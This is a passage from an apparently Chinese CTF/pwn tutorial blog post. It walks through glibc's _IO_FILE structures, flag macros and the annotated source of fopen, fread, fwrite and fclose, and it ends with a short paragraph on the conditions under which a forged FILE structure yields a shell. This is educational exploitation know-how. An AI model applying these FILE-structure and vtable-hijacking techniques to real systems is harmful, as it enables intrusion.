class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_marker</span> *_markers;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_chain;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno; <span class="comment">// stderr:2, stdout:1, stdin:0</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="type">int</span> _blksize;</span><br><span class="line">  <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _file;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *_codecvt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> *_wide_data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_freeres_list;</span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="type">void</span> *__pad1;</span><br><span class="line">      <span class="type">void</span> *__pad2;</span><br><span class="line">      <span class="type">void</span> *__pad3;</span><br><span class="line">      <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="built_in">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="built_in">sizeof</span> (<span class="type">void</span> *) - <span class="built_in">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _IO_FILE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> *_IO_list_all;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stdin_;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stdout_;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> _IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure></div>

<p><strong>图解</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/IO_FILE_1.png"
                      alt="IO_FILE_1"
                ></p>
<h2 id="IO相关函数概述"><a href="#IO相关函数概述" class="headerlink" title="IO相关函数概述"></a>IO相关函数概述</h2><ul>
<li><p><code>fopen</code> 未调用 <code>vtable</code> 中的函数，<code>fopen</code> 对应的函数 <code>__fopen_internal</code> 内部会调用 <code>malloc</code> 函数，分配 <code>FILE</code> 结构的空间。因此我们可以获知 <code>FILE</code> 结构是存储在堆上的。</p>
</li>
<li><p>流程</p>
<ul>
<li><p>使用 <code>malloc</code> 分配 <code>FILE</code> 结构</p>
</li>
<li><p>设置 <code>FILE</code> 结构的 <code>vtable</code></p>
</li>
<li><p>初始化分配的 <code>FILE</code> 结构</p>
</li>
<li><p>将初始化的 <code>FILE</code> 结构链入 <code>FILE</code> 结构链表头部</p>
</li>
<li><p>调用系统调用打开文件</p>
</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fopen() 函数</span></span><br><span class="line"><span class="comment">// libio/iofopen.c</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">locked_FILE</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">		_IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> wd;</span><br><span class="line">	&#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="built_in">sizeof</span> (<span class="keyword">struct</span> locked_FILE));   <span class="comment">// 为 FILE 结构分配空间</span></span><br><span class="line">    <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">     new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">    _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; <span class="comment">// 设置 vtable = &amp;_IO_file_jumps</span></span><br><span class="line">	_IO_file_init (&amp;new_f-&gt;fp); <span class="comment">// 调用 _IO_file_init 函数进行初始化</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">	new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)    <span class="comment">// 打开目标文件</span></span><br><span class="line">        <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line">    _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">	<span class="built_in">free</span> (new_f);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/fileops.c</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">       of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">       position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">	fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">    fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line">    _IO_link_in (fp);         <span class="comment">// 调用 _IO_link_in 函数将 fp 放进链表</span></span><br><span class="line">    fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">        _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">        _IO_lock_lock (list_all_lock);</span><br><span class="line">        run_fp = (_IO_FILE *) fp;</span><br><span class="line">        _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;  <span class="comment">// fp 放到链表头部</span></span><br><span class="line">        _IO_list_all = fp;                            <span class="comment">// 链表头 _IO_list_all 指向 fp</span></span><br><span class="line">        ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">        _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">        run_fp = <span class="literal">NULL</span>;</span><br><span class="line">        _IO_lock_unlock (list_all_lock);</span><br><span class="line">        _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fread()</code>   最终会调用  <code>_IO_fiel_xsgetn</code> <ul>
<li>流程大致为 <code>_IO_fread-&gt;_IO_sgetn-&gt;_IO_XSGETN-&gt;_IO_file_xsgetn</code>。</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fread</span></span><br><span class="line"><span class="comment">// libio/iofread.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* buf: 存放读取数据的缓冲区。</span></span><br><span class="line"><span class="comment">* size: 指定每个记录的长度。</span></span><br><span class="line"><span class="comment">* count: 指定记录的个数。</span></span><br><span class="line"><span class="comment">* stream: 目标文件流。</span></span><br><span class="line"><span class="comment">* 返回值: 返回读取到数据缓冲区中的记录个数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t bytes_requested = size * count;</span><br><span class="line">    _IO_size_t bytes_read;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span> (fp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);   <span class="comment">// 调用 _IO_sgetn 函数</span></span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">    <span class="keyword">return</span> _IO_XSGETN (fp, data, n);          <span class="comment">// 调用宏 _IO_XSGETN</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">	_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">	(*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset))</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"><span class="meta">#   <span class="keyword">define</span> _IO_vtable_offset(THIS) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fwrite</code> 最终会调用 <code>_IO_file_xsputn</code><ul>
<li>流程 <code>_IO_fwrite-&gt;_IO_XSPUTN-&gt;_IO_new_file_xsputn-&gt;_IO_OVERFLOW-&gt;_IO_new_file_overflow</code></li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fwrite()</span></span><br><span class="line"><span class="comment">// libio/iofwrite.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* buf: 是一个指针，对 fwrite 来说，是要写入数据的地址;</span></span><br><span class="line"><span class="comment">* size: 要写入内容的单字节数;</span></span><br><span class="line"><span class="comment">* count: 要进行写入 size 字节的数据项的个数;</span></span><br><span class="line"><span class="comment">* stream: 目标文件指针;</span></span><br><span class="line"><span class="comment">* 返回值: 实际写入的数据项个数 count。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t request = size * count;</span><br><span class="line">    _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span> (fp, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">        written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);      <span class="comment">// 调用 _IO_sputn 函数</span></span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">       this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">       simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">       buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">    <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fclose</code> 最终会调用 <code>_IO_file_finish</code><ul>
<li>流程大致如下<ul>
<li><code>_IO_unlink_it</code> 将指定的 <code>FILE</code> 从 <code>_chain</code> 链表中摘除</li>
<li><code>_IO_file_close_it</code> 会调用系统接口 <code>close</code> 关闭文件</li>
<li><code>_IO_FINISH-&gt;_IO_file_finish</code> 会调用 <code>free</code> 函数释放 <code>FILE</code> 结构</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libio/iofclose.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="built_in">CHECK_FILE</span>(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">    <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">       strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">       here.  */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">        _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);  <span class="comment">// 将 fp 从链表中取出</span></span><br><span class="line">    _IO_acquire_lock (fp);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">        status = _IO_file_close_it (fp);            <span class="comment">// 关闭目标文件</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    _IO_FINISH (fp);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">         <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">         <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *cc = fp-&gt;_codecvt;</span><br><span class="line">         __libc_lock_lock (__gconv_lock);</span><br><span class="line">         __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">         __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">         __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">              _IO_free_backup_area (fp);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">      &#123;</span><br><span class="line">          fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">free</span>(fp);                                 <span class="comment">// 释放 FILE 结构体</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="getshell-一般条件"><a href="#getshell-一般条件" class="headerlink" title="getshell 一般条件"></a>getshell 一般条件</h2><p>必须要 <code>libc</code> 的低 <code>32</code> 位地址为负时，攻击才会成功。在 <code>fflush</code> 函数的检查里，它第二步才是跳转，第一步的检查，在 <code>arena</code> 里的伪造 <code>file</code> 结构中这两个值，绝对值一定可以通过，那么就会直接执行虚表函数。所以只有为负时，才会 <code>check</code> 失效。</p>
